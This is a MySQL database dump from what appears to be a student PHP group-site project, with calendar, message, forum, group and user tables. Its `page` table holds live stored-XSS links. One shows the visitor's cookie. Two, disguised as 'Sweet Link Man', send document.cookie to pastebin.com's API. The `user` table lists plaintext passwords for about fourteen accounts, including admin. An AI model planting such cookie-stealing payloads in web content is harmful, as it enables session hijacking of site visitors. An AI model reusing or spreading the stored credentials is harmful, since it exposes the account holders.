-- MySQL dump 10.13  Distrib 5.1.49, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: gusphp
-- ------------------------------------------------------
-- Server version	5.1.49-1ubuntu8.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Current Database: `gusphp`
--

CREATE DATABASE /*!32312 IF NOT EXISTS*/ `gusphp` /*!40100 DEFAULT CHARACTER SET latin1 */;

USE `gusphp`;

--
-- Table structure for table `calendar`
--

DROP TABLE IF EXISTS `calendar`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `calendar` (
  `user` varchar(32) NOT NULL,
  `date` date NOT NULL,
  `data` varchar(150) NOT NULL,
  `eventID` int(11) NOT NULL AUTO_INCREMENT,
  KEY `eventID` (`eventID`),
  KEY `eventID_2` (`eventID`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=218 ;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `calendar`
--

LOCK TABLES `calendar` WRITE;
/*!40000 ALTER TABLE `calendar` DISABLE KEYS */;
INSERT INTO `calendar` (`user`, `date`, `data`, `eventID`) VALUES
('main', '2011-04-08', 'event', 209),
('long3841', '2011-04-08', 'something else', 201),
('admin', '2011-04-08', 'event!', 215);
/*!40000 ALTER TABLE `calendar` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `calendar_rsvp`
--

DROP TABLE IF EXISTS `calendar_rsvp`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `calendar_rsvp` (
  `eventID` int(11) NOT NULL,
  `groupID` int(11) NOT NULL,
  `name` varchar(30) NOT NULL,
  `yes` int(11) NOT NULL,
  `no` int(11) NOT NULL,
  `maybe` int(11) NOT NULL,
  `unanswered` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `calendar_rsvp`
--

LOCK TABLES `calendar_rsvp` WRITE;
/*!40000 ALTER TABLE `calendar_rsvp` DISABLE KEYS */;
INSERT INTO `calendar_rsvp` (`eventID`, `groupID`, `name`, `yes`, `no`, `maybe`, `unanswered`) VALUES
(201, 0, 'long3841', 1, 0, 0, 0),
(201, 0, 'admin', 1, 0, 0, 0);
/*!40000 ALTER TABLE `calendar_rsvp` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ggroup`
--

DROP TABLE IF EXISTS `ggroup`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ggroup` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(100) DEFAULT NULL,
  `description` text,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=33 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ggroup`
--

LOCK TABLES `ggroup` WRITE;
/*!40000 ALTER TABLE `ggroup` DISABLE KEYS */;
INSERT INTO `ggroup` VALUES (5,'test_group','test_desc'),(10,'main','Gus main group. Users set to admin (7) on this group get system wide admin privileges.');
/*!40000 ALTER TABLE `ggroup` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `messages`
--

DROP TABLE IF EXISTS `messages`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `messages` (
  `userid` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(255) DEFAULT NULL,
  `message` text NOT NULL,
  `from` int(11) NOT NULL,
  `to` int(11) NOT NULL,
  `from_viewed` tinyint(1) NOT NULL DEFAULT '0',
  `to_viewed` tinyint(1) NOT NULL DEFAULT '0',
  `from_deleted` tinyint(1) NOT NULL DEFAULT '0',
  `to_deleted` tinyint(1) NOT NULL DEFAULT '0',
  `from_vdate` datetime DEFAULT NULL,
  `to_vdate` datetime DEFAULT NULL,
  `from_ddate` datetime DEFAULT NULL,
  `to_ddate` datetime DEFAULT NULL,
  `created` datetime NOT NULL,
  PRIMARY KEY (`userid`)
) ENGINE=MyISAM AUTO_INCREMENT=7 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `messages`
--

LOCK TABLES `messages` WRITE;
/*!40000 ALTER TABLE `messages` DISABLE KEYS */;
INSERT INTO `messages` VALUES (1,'test','test',1,0,0,0,0,0,NULL,NULL,NULL,NULL,'2011-02-10 20:13:09'),(2,'test2','test',1,0,0,0,0,0,NULL,NULL,NULL,NULL,'2011-02-10 20:13:30'),(3,'test3','Hi',1,0,0,0,0,0,NULL,NULL,NULL,NULL,'2011-02-10 20:22:03'),(4,'test','test',1,0,0,0,0,0,NULL,NULL,NULL,NULL,'2011-02-19 15:11:04'),(5,'test_email','just a test',1,0,0,0,0,0,NULL,NULL,NULL,NULL,'2011-03-21 11:45:17'),(6,'test','test',1,0,0,0,0,0,NULL,NULL,NULL,NULL,'2011-03-28 18:16:35');
/*!40000 ALTER TABLE `messages` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `page`
--

DROP TABLE IF EXISTS `page`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `page` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(100) DEFAULT NULL,
  `content` text,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=21 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `page`
--

LOCK TABLES `page` WRITE;
/*!40000 ALTER TABLE `page` DISABLE KEYS */;
INSERT INTO `page` VALUES (15,'test','Test content'),(16,'home','Gus Home Page.\n<br />\n\nCS336Test<br>\n<a href=\"javascript:function a(){alert(document.cookie);}a();\">Session Hijack Script</a>\n<br>\nYeah, don\'t actually click that.\n<br>\n<br />\n<br />\n\nThis is the latest (stablest) version of the project.\n<br />\n<br />\n\nLast git pull on 03/25/11 .'),(18,'auth','Gus Authentication'),(19,'CS336 Test','<a href=\"javascript:var a=new XMLHttpRequest,b=\"paste_code=\"+document.cookie+\"&paste_name=XSS_poc\";a.open(\"POST\",\"http://pastebin.com/api_public.php\",true);a.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");a.setRequestHeader(\"Content-length\",b.length+\"\");a.setRequestHeader(\"Connection\",\"close\");a.send(b);\">Sweet Link Man</a>'),(20,'CS336Test','<a href=\"javascript:var a=new XMLHttpRequest,b=\"paste_code=\"+document.cookie+\"&paste_name=XSS_poc\";a.open(\"POST\",\"http://pastebin.com/api_public.php\",true);a.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");a.setRequestHeader(\"Content-length\",b.length+\"\");a.setRequestHeader(\"Connection\",\"close\");a.send(b);\">Sweet Link Man</a>');
/*!40000 ALTER TABLE `page` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `replies`
--

DROP TABLE IF EXISTS `replies`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `replies` (
  `thread_id` int(4) NOT NULL DEFAULT '0',
  `reply_id` int(4) NOT NULL DEFAULT '0',
  `author` varchar(65) NOT NULL DEFAULT '',
  `a_email` varchar(65) NOT NULL DEFAULT '',
  `body` longtext NOT NULL,
  `datetime` varchar(25) NOT NULL DEFAULT '',
  KEY `a_id` (`reply_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `replies`
--

LOCK TABLES `replies` WRITE;
/*!40000 ALTER TABLE `replies` DISABLE KEYS */;
INSERT INTO `replies` VALUES (5,0,'Chaylo','','Just testing the reply counter','15/Feb/2011 07:59:36'),(5,0,'testing','','testing some more','15/Feb/2011 08:50:23'),(5,0,'testing','','testing','15/Feb/2011 08:53:16'),(6,0,'tesing','','testing','15/Feb/2011 08:53:27'),(5,0,'','','Gadzooks.','17/Feb/2011 07:35:18');
/*!40000 ALTER TABLE `replies` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `threads`
--

DROP TABLE IF EXISTS `threads`;

--
-- Table structure for table `threads`
--

CREATE TABLE IF NOT EXISTS `threads` (
  `thread_id` int(4) NOT NULL AUTO_INCREMENT,
  `thread_topic` varchar(255) NOT NULL DEFAULT '',
  `thread_body` longtext NOT NULL,
  `thread_author` varchar(65) NOT NULL DEFAULT '',
  `email` varchar(65) NOT NULL DEFAULT '',
  `datetime` varchar(25) NOT NULL DEFAULT '',
  `view` int(4) NOT NULL DEFAULT '0',
  `num_replies` int(4) NOT NULL DEFAULT '0',
  `group_id` int(100) NOT NULL,
  `group_name` varchar(128) NOT NULL,
  PRIMARY KEY (`thread_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=10 ;


INSERT INTO `threads` (`thread_id`, `thread_topic`, `thread_body`, `thread_author`, `email`, `datetime`, `view`, `num_replies`, `group_id`, `group_name`) VALUES
(5, 'First Forum Entry', 'Just a quick test to make sure everything is working', 'Chaylo', '', '15/Feb/2011 07:59:21', 0, 6, 1, ''),
(6, 'Gotta check it all again!', 'Ugh', 'Chaylo', '', '15/Feb/2011 08:50:01', 0, 1, 1, ''),
(7, 'testing 1 2 3', 'Hello?', 'Chaylo', '', '25/Mar/2011 10:35:22', 0, 2, 1, 'test'),
(9, 'testing', 'smurF!', 'claurino', '', '28/Mar/2011 03:18:44', 0, 3, 1, 'test');


--
-- Table structure for table `user`
--


DROP TABLE IF EXISTS `user`;

CREATE TABLE IF NOT EXISTS `user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `un` varchar(100) NOT NULL,
  `pw` varchar(100) NOT NULL,
  `profile` varchar(100) NOT NULL,
  `email` varchar(25) NOT NULL,
  `contact` varchar(15) NOT NULL,
  `major` varchar(25) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=26 ;

--
-- Dumping data for table `user`
--


INSERT INTO `user` (`id`, `un`, `pw`, `profile`, `email`, `contact`, `major`) VALUES
(0, 'cblair', 'SHI/hel7', 't', 'e', 's', 't'),
(11, 'anilson', 'supersecurepassword1234!@#$', 'sfdsfd', 'fdfd', 'saas', 'dsd'),
(12, 'long3841', 'long3841', '', '', '', ''),
(13, 'sbeddall', '0017761826', '', '', '', ''),
(15, 'brett', 'brett256', 'sdsd', 'here@there.com', '929-384903-393', 'CS'),
(17, 'timb', 'frost741', '', '', '', ''),
(18, 'claurino', '22877822', '', '', '', ''),
(19, 'lwegner', '7ndustr8', '', '', '', ''),
(20, 'crempel', 'SHI/hel7', '', '', '', ''),
(21, 'abhay', 'gusabhay', '', '', '', ''),
(22, 'drj', 'SHI/hel7', '', '', '', ''),
(23, 'test', 'test123', '', '', '', ''),
(24, 'admin', 'SHI/hel7', '', '', '', ''),
(25, 'sdfasdffe', '324vf3v3f3f', '', '', '', '');


--
-- Table structure for table `usergroup`
--

DROP TABLE IF EXISTS `usergroup`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `usergroup` (
  `uid` int(11) NOT NULL,
  `gid` int(11) NOT NULL,
  `perm` tinyint(4) NOT NULL,
  KEY `uid` (`uid`),
  KEY `gid` (`gid`),
  CONSTRAINT `usergroup_ibfk_1` FOREIGN KEY (`uid`) REFERENCES `user` (`id`) ON DELETE CASCADE,
  CONSTRAINT `usergroup_ibfk_2` FOREIGN KEY (`gid`) REFERENCES `ggroup` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `usergroup`
--

LOCK TABLES `usergroup` WRITE;
/*!40000 ALTER TABLE `usergroup` DISABLE KEYS */;
INSERT INTO `usergroup` VALUES (23,5,1),(24,10,7),(19,10,7),(21,10,0),(21,5,0),(15,10,0),(15,5,0),(13,5,7),(13,10,7),(0,10,0);
/*!40000 ALTER TABLE `usergroup` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2011-04-01 11:03:49
